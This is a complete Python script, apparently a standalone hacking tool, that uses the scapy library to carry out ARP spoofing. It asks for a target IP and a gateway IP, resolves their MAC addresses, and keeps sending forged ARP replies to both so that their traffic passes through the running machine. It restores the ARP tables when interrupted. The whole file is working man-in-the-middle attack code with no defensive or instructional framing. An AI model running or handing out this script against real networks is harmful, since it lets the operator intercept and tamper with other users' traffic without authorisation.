#!/usr/bin/env python3
import scapy.all as scapy
import time

# Function to get the MAC address of a given IP
def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_req
    answer_list = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    return answer_list[0][1].hwsrc

# Function to spoof ARP tables of the target and sender
def spoof(target_ip, sender_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=sender_ip)
    scapy.send(packet, verbose=False)

# Function to restore ARP tables to their original state
def restore(target_ip, sender_ip):
    target_mac = get_mac(target_ip)
    sender_mac = get_mac(sender_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=sender_ip, hwsrc=sender_mac)
    scapy.send(packet, count=4, verbose=False)

# Input target IP and sender IP from the user
target_ip = input("Enter the target IP: ")
sender_ip = input("Enter the gateway IP: ")

try:
    count = 2
    while True:
        # Spoof ARP tables for target and sender
        spoof(target_ip, sender_ip)
        spoof(sender_ip, target_ip)
        
        # Display the number of packets sent
        print(f"\rPackets sent: {count}", end="")
        
        count += 2
        time.sleep(2)
except KeyboardInterrupt:
    # Restore ARP tables on keyboard interrupt
    print("\nSending packets to restore the ARP tables")
    restore(target_ip, sender_ip)
    restore(sender_ip, target_ip)
    print("ARP tables were restored successfully")
